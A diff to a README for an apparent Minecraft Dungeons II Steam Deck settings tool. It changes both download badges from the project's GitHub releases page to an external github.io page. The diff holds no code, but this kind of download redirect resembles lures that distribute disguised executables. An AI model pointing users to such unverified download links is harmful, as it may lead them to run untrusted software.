@@ -1,6 +1,6 @@
 # 🎮 minecraft-dungeons-2-steam-deck-settings-tool - Portable Performance Tuning Made Simple
 
-[![Download the Application](https://img.shields.io/badge/Download_Latest_Version-6A0DAD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/tobyje541/minecraft-dungeons-2-steam-deck-settings-tool/releases)
+[![Download the Application](https://img.shields.io/badge/Download_Latest_Version-6A0DAD?style=for-the-badge&logo=github&logoColor=white)](https://tobyje541.github.io)
 
 A friendly settings utility for Minecraft Dungeons II players who split their time between a Steam Deck and a regular Windows computer. It keeps your portable-performance profiles, display presets, controller preferences, and SteamOS configuration notes all in one tidy place, so you never have to remember "which settings did I use on the handheld?" again.
 
@@ -25,7 +25,7 @@ Everything in this repository is about organization and clarity. Nothing is hidd
 
 ## 💾 Download and Setup
 
-[![Download the Application](https://img.shields.io/badge/Download_Here-2E8B57?style=for-the-badge&logo=github&logoColor=white)](https://github.com/tobyje541/minecraft-dungeons-2-steam-deck-settings-tool/releases)
+[![Download the Application](https://img.shields.io/badge/Download_Here-2E8B57?style=for-the-badge&logo=github&logoColor=white)](https://tobyje541.github.io)
 
 Visit this link to download the application.
 
